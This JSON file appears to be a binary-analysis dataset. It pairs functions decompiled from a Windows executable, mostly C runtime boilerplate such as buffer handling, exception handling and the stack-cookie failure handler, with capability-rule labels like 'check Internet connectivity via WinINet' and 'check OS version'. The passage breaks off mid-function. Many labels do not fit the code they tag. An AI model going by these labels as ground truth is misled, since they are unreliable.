{
    "00405982": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405982(uint *param_1)\n\n{\n    *param_1 = 0x401694;\n    if (param_1[2] != 0) {\n        fcn.0040638f(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00404703": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404703(uint32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    if ((arg_8h != 0) && (in_EAX = fcn.004046af(),  in_EAX <= arg_8h)) {\n        iVar1 = fcn.004046af();\n        in_EAX = iVar1 + *(in_ECX + 0x14);\n        if (arg_8h < in_EAX) {\n            return CONCAT31(in_EAX >> 8, 1);\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 152
    },
    "0040481a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040481a(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint var_ch;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    else if (0xffffffff / arg_8h == 0) {\n        fcn.00403570(0);\n        fcn.00405ec8(&var_ch, 0x4176b0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.00405e63(arg_8h);\n    return;\n}\n",
        "token_count": 140
    },
    "00404927": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00404927(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00404745();\n    if (uVar1 < 2) {\n        return 1;\n    }\n    return uVar1 - 1;\n}\n",
        "token_count": 62
    },
    "004049da": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004049da(uint arg_8h, int32_t arg_ch)\n\n{\n    uint arg_10h;\n    int32_t in_ECX;\n    \n    if ((arg_8h != '\\0') && (0xf < *(in_ECX + 0x18))) {\n        arg_10h = *(in_ECX + 4);\n        if (arg_ch != 0) {\n            fcn.0040497a(in_ECX + 4, 0x10, arg_10h, arg_ch);\n        }\n        fcn.004046bd(arg_10h);\n    }\n    *(in_ECX + 0x18) = 0xf;\n    fcn.004048e7(arg_ch);\n    return;\n}\n",
        "token_count": 165
    },
    "00404ae6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl\nfcn.00404ae6(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint arg_8h_00;\n    uint arg_10h;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint uVar4;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004062fc();\n    *(unaff_EBP + -0x10) = &var_18h;\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    uVar3 = *(unaff_EBP + 8) | 0xf;\n    uVar2 = fcn.00404927();\n    *(unaff_EBP + -0x1c) = uVar2;\n    if (uVar2 < uVar3) {\n        uVar3 = *(unaff_EBP + 8);\n    }\n    else {\n        uVar2 = *(extraout_ECX + 0x18);\n        *(unaff_EBP + -0x14) = uVar2;\n        *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) >> 1;\n        uVar1 = *(unaff_EBP + -0x14);\n        if ((uVar3 / 3 < uVar1) && (uVar2 <= *(unaff_EBP + -0x1c) - uVar1)) {\n            uVar3 = uVar1 + uVar2;\n        }\n    }\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = fcn.00404969(uVar3 + 1);\n    if (*(unaff_EBP + 0xc) != 0) {\n        uVar4 = *(unaff_EBP + 0xc);\n        arg_10h = fcn.004046af();\n        fcn.0040497a(arg_8h_00, uVar3 + 1, arg_10h, uVar4);\n    }\n    fcn.004049da(1, 0);\n    uVar4 = *(unaff_EBP + 0xc);\n    *(extraout_ECX + 4) = arg_8h_00;\n    *(extraout_ECX + 0x18) = uVar3;\n    fcn.004048e7(uVar4);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 694
    },
    "00404c5b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404c5b(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    \n    uVar1 = fcn.00404927();\n    if (uVar1 < arg_8h) {\n        fcn.00405817();\n    }\n    if (*(in_ECX + 0x18) < arg_8h) {\n        fcn.00404ae6(arg_8h, *(in_ECX + 0x14), unaff_EDI, unaff_ESI, unaff_EBP, unaff_retaddr, arg_8h, arg_ch);\n    }\n    else if ((arg_ch == '\\0') || (0xf < arg_8h)) {\n        if (arg_8h == 0) {\n            fcn.004048e7(0);\n        }\n    }\n    else {\n        uVar1 = *(in_ECX + 0x14);\n        if (arg_8h < *(in_ECX + 0x14)) {\n            uVar1 = arg_8h;\n        }\n        fcn.004049da(1, uVar1);\n    }\n    return arg_8h != 0;\n}\n",
        "token_count": 301
    },
    "004051d7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_2\n\nvoid __cdecl fcn.004051d7(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint noname_4, uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_8h;\n    uint var_ch;\n    uint var_4h;\n    uint var_14h;\n    uint var_ch_2;\n    \n    fcn.004062fc();\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    *(unaff_EBP + -0x14) = *(unaff_EBP + 8);\n    while (*(unaff_EBP + 0xc) != 0) {\n        fcn.00405123(*(unaff_EBP + 8), *(unaff_EBP + 0x10));\n        *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + -1;\n        *(unaff_EBP + 8) = *(unaff_EBP + 8) + 0x1c;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 303
    },
    "0040600a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040600a(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x4060b5;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.004060e1;\n        uStack36 = *0x5bbe9c ^ &fcn.0040600a::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0040600a::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00408722();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.0040600a::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 724
    },
    "00406aeb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406aeb(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x5bbe9c) {\n        return;\n    }\n    *0x5d6ef0 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x5d6ef4 = &arg_8h;\n    *0x5d6e30 = 0x10001;\n    *0x5d6dd8 = 0xc0000409;\n    *0x5d6ddc = 1;\n    var_328h = *0x5bbe9c;\n    var_324h = *0x5bbea0;\n    *0x5d6de4 = unaff_retaddr;\n    *0x5d6ebc = in_GS;\n    *0x5d6ec0 = in_FS;\n    *0x5d6ec4 = in_ES;\n    *0x5d6ec8 = in_DS;\n    *0x5d6ecc = unaff_EDI;\n    *0x5d6ed0 = unaff_ESI;\n    *0x5d6ed4 = unaff_EBX;\n    *0x5d6ed8 = in_EDX;\n    *0x5d6edc = in_ECX;\n    *0x5d6ee0 = in_EAX;\n    *0x5d6ee4 = unaff_EBP;\n    *0x5d6ee8 = unaff_retaddr;\n    *0x5d6eec = in_CS;\n    *0x5d6ef8 = in_SS;\n    *0x5d6e28 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00408453(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x401fbc);\n    if (*0x5d6e28 == 0) {\n        fcn.00408453(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 869
    },
    "00408d2b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00408d2b(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00408722();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00408722();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00408ff3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408ff3(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.00406248(*(unaff_EBP + -0x28));\n    iVar1 = fcn.00408722();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.00408722();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.00406221(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00408d8b(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "0040aa30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040ab23: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0040ab28)\n// WARNING: Removing unreachable block (ram,0x0040ab56)\n// WARNING: Removing unreachable block (ram,0x0040ab2e)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040aa30(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040a6d0(0x417d50, 0x18);\n    fcn.00409bd6(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x5d698c != 1) {\n        *0x5d6988 = 1;\n        *0x5d6984 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.004084d6(*0x5d83ac);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.004084d6(*0x5d83a8);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.004084cd();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.004084d6(*piVar2);\n                        iVar3 = fcn.004084cd();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.004084d6(*0x5d83ac);\n                        piVar1 = fcn.004084d6(*0x5d83a8);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.0040a96a(0x4012bc);\n        }\n        fcn.0040a96a(0x4012c4);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00409afc(8);\n    }\n    return;\n}\n",
        "token_count": 810
    },
    "0040b208": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040b208(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00409afc(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0040ee4a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040ee4a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x5bbe9c ^ &stack0xfffffffc;\n    fcn.004074a5(arg_10h);\n    var_14h = fcn.00412c98(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00412210(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040eea3:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040eee3;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040eed5:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040eee3;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040eed5;\n        goto code_r0x0040eea3;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040eee3:\n    fcn.00406aeb(unaff_EBX);\n    return;\n}\n",
        "token_count": 504
    },
    "0040eef2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040eef2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x5bbe9c ^ &stack0xfffffffc;\n    fcn.004074a5(arg_10h);\n    var_14h = fcn.00412c98(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00412754(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040ef4b:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040ef8b;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040ef7d:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040ef8b;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040ef7d;\n        goto code_r0x0040ef4b;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040ef8b:\n    fcn.00406aeb(unaff_EBX);\n    return;\n}\n",
        "token_count": 511
    },
    "0041025b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041025b(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.004084cd();\n    var_4h = 0;\n    if (*0x5d7194 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x40283c);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x402830);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x5d7194 = fcn.0040845b(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x402820);\n        *0x5d7198 = fcn.0040845b(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x40280c);\n        *0x5d719c = fcn.0040845b(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x4027f0);\n        *0x5d71a4 = fcn.0040845b(uVar3);\n        if (*0x5d71a4 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x4027d8);\n            *0x5d71a0 = fcn.0040845b(uVar3);\n        }\n    }\n    if ((*0x5d71a0 != iVar1) && (*0x5d71a4 != iVar1)) {\n        pcVar4 = fcn.004084d6(*0x5d71a0);\n        pcVar5 = fcn.004084d6(*0x5d71a4);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0041039d;\n        }\n    }\n    if ((((*0x5d7198 != iVar1) && (pcVar4 = fcn.004084d6(*0x5d7198),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x5d719c != iVar1 && (pcVar4 = fcn.004084d6(*0x5d719c),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0041039d:\n    pcVar4 = fcn.004084d6(*0x5d7194);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 851
    },
    "00412210": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412210(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00412711;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x00412345;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0041234c;\ncode_r0x00412345:\n                        do {\n                            var_4h = 1;\ncode_r0x0041234c:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0041235a;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0041235a:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if 